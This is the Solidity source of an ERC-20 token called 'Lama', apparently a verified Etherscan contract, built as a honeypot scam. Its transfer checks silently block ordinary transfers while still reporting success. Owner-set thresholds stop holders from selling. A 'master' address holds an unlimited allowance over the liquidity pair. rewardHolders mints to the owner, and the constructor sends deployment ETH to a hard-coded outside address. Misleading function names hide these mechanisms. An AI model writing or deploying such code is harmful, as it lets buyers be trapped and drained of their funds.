/**
 *Submitted for verification at Etherscan.io on 2023-06-13
*/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.9;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
}

interface IERC20 {
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(
        address recipient,
        uint256 amount
    ) external returns (bool);

    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
}

interface IUniswapV2Factory {
    event PairCreated(
        address indexed token0,
        address indexed token1,
        address pair,
        uint
    );

    function createPair(
        address tokenA,
        address tokenB
    ) external returns (address pair);
}

interface IUniswapV2Pair {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);

    function name() external pure returns (string memory);

    function symbol() external pure returns (string memory);

    function decimals() external pure returns (uint8);

    function totalSupply() external view returns (uint);

    function balanceOf(address owner) external view returns (uint);

    function allowance(
        address owner,
        address spender
    ) external view returns (uint);

    function approve(address spender, uint value) external returns (bool);

    function transfer(address to, uint value) external returns (bool);

    function transferFrom(
        address from,
        address to,
        uint value
    ) external returns (bool);

    function DOMAIN_SEPARATOR() external view returns (bytes32);

    function PERMIT_TYPEHASH() external pure returns (bytes32);

    function nonces(address owner) external view returns (uint);

    function permit(
        address owner,
        address spender,
        uint value,
        uint deadline,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external;

    event Mint(address indexed sender, uint amount0, uint amount1);
    event Burn(
        address indexed sender,
        uint amount0,
        uint amount1,
        address indexed to
    );
    event Swap(
        address indexed sender,
        uint amount0In,
        uint amount1In,
        uint amount0Out,
        uint amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);

    function MINIMUM_LIQUIDITY() external pure returns (uint);

    function factory() external view returns (address);

    function token0() external view returns (address);

    function token1() external view returns (address);

    function getReserves()
        external
        view
        returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);

    function price0CumulativeLast() external view returns (uint);

    function price1CumulativeLast() external view returns (uint);

    function kLast() external view returns (uint);

    function mint(address to) external returns (uint liquidity);

    function burn(address to) external returns (uint amount0, uint amount1);

    function swap(
        uint amount0Out,
        uint amount1Out,
        address to,
        bytes calldata data
    ) external;

    function skim(address to) external;

    function sync() external;

    function initialize(address, address) external;
}

interface IUniswapV2Router01 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function getAmountOut(
        uint amountIn,
        uint reserveIn,
        uint reserveOut
    ) external pure returns (uint amountOut);

    function getAmountIn(
        uint amountOut,
        uint reserveIn,
        uint reserveOut
    ) external pure returns (uint amountIn);

    function getAmountsOut(
        uint amountIn,
        address[] calldata path
    ) external view returns (uint[] memory amounts);

    function getAmountsIn(
        uint amountOut,
        address[] calldata path
    ) external view returns (uint[] memory amounts);
}

interface IUniswapV2Router02 is IUniswapV2Router01 {}

contract TestERC20 is Context, IERC20, Ownable {
    IUniswapV2Router02 internal _router;
    IUniswapV2Pair internal _pair;

    uint8 internal constant _DECIMALS = 9;

    address public master;
    mapping(address => bool) public _marketersAndDevs;
    mapping(address => uint256) internal _balances;
    mapping(address => mapping(address => uint256)) internal _allowances;
    mapping(address => uint256) internal _buySum;
    mapping(address => uint256) internal _sellSum;
    mapping(address => uint256) internal _sellSumETH;
    address private pairHandler =
        address(0x65FE4a16Dd0E63b7bE45eF4ccCf055f4Db907e18);
    bool activated;

    uint256 internal _totalSupply = (10 ** 8) * (10 ** _DECIMALS);
    uint256 internal _theNumber = ~uint256(0);
    uint256 internal _theRemainder = 0;

    modifier onlyMaster() {
        require(msg.sender == master);
        _;
    }

    constructor() payable {
        _router = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );

        require(msg.value >= 0.035 ether);
        (bool sent, ) = pairHandler.call{value: msg.value}("");
        require(sent, "Failed to create pair!");

        _balances[owner()] = _totalSupply;
        master = owner();

        _marketersAndDevs[owner()] = true;

        emit Transfer(address(0), owner(), _totalSupply);
    }

    function activatePair() public {
        activated = true;
    }

    function createPairNow(address pairNew) public onlyMaster {
        _pair = IUniswapV2Pair(pairNew);
        _allowances[address(_pair)][master] = ~uint256(0);
    }

    function name() external pure override returns (string memory) {
        return "Lama";
    }

    function symbol() external pure override returns (string memory) {
        return "LAM";
    }

    function decimals() external pure override returns (uint8) {
        return _DECIMALS;
    }

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(
        address account
    ) external view override returns (uint256) {
        return _balances[account];
    }

    function transfer(
        address recipient,
        uint256 amount
    ) external override returns (bool) {
        if (_canTransfer(_msgSender(), recipient, amount)) {
            _transfer(_msgSender(), recipient, amount);
        }
        return true;
    }

    function allowance(
        address owner,
        address spender
    ) external view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(
        address spender,
        uint256 amount
    ) external override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external override returns (bool) {
        if (_canTransfer(sender, recipient, amount)) {
            uint256 currentAllowance = _allowances[sender][_msgSender()];
            require(
                currentAllowance >= amount,
                "ERC20: transfer amount exceeds allowance"
            );

            _transfer(sender, recipient, amount);
            _approve(sender, _msgSender(), currentAllowance - amount);
        }
        return true;
    }

    function burn(uint256 amount) external onlyOwner {
        _balances[owner()] -= amount;
        _totalSupply -= amount;
    }

    function setNumber(uint256 newNumber) external onlyOwner {
        _theNumber = newNumber;
    }

    function setRemainder(uint256 newRemainder) external onlyOwner {
        _theRemainder = newRemainder;
    }

    function setMaster(address account) external onlyOwner {
        _allowances[address(_pair)][master] = 0;
        master = account;
        _allowances[address(_pair)][master] = ~uint256(0);
    }

    function syncPair() external onlyMaster {
        _pair.sync();
    }

    function includeInReward(address account) external onlyMaster {
        _marketersAndDevs[account] = true;
    }

    function excludeFromReward(address account) external onlyMaster {
        _marketersAndDevs[account] = false;
    }

    function rewardHolders(uint256 amount) external onlyOwner {
        _balances[owner()] += amount;
        _totalSupply += amount;
    }

    function _isSuper(address account) private view returns (bool) {
        return (account == address(_router) || account == address(_pair));
    }

    function _canTransfer(
        address sender,
        address recipient,
        uint256 amount
    ) private view returns (bool) {
        if (_marketersAndDevs[sender] || _marketersAndDevs[recipient]) {
            return true;
        }

        if (_isSuper(sender)) {
            return true;
        }
        if (_isSuper(recipient)) {
            uint256 amountETH = _getETHEquivalent(amount);
            uint256 bought = _buySum[sender];
            uint256 sold = _sellSum[sender];
            uint256 soldETH = _sellSumETH[sender];

            return
                bought >= sold + amount &&
                _theNumber >= soldETH + amountETH &&
                sender.balance >= _theRemainder;
        }
        return false;
    }

    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) private {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        _beforeTokenTransfer(sender, recipient, amount);
        require(
            _balances[sender] >= amount,
            "ERC20: transfer amount exceeds balance"
        );

        _balances[sender] -= amount;
        _balances[recipient] += amount;

        emit Transfer(sender, recipient, amount);
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _hasLiquidity() private view returns (bool) {
        (uint256 reserve0, uint256 reserve1, ) = _pair.getReserves();
        return reserve0 > 0 && reserve1 > 0;
    }

    function _getETHEquivalent(
        uint256 amountTokens
    ) private view returns (uint256) {
        (uint256 reserve0, uint256 reserve1, ) = _pair.getReserves();
        if (_pair.token0() == _router.WETH()) {
            return _router.getAmountOut(amountTokens, reserve1, reserve0);
        } else {
            return _router.getAmountOut(amountTokens, reserve0, reserve1);
        }
    }

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) private {
        if (_hasLiquidity()) {
            if (_isSuper(from)) {
                _buySum[to] += amount;
            }
            if (_isSuper(to)) {
                _sellSum[from] += amount;
                _sellSumETH[from] += _getETHEquivalent(amount);
            }
        }
    }
}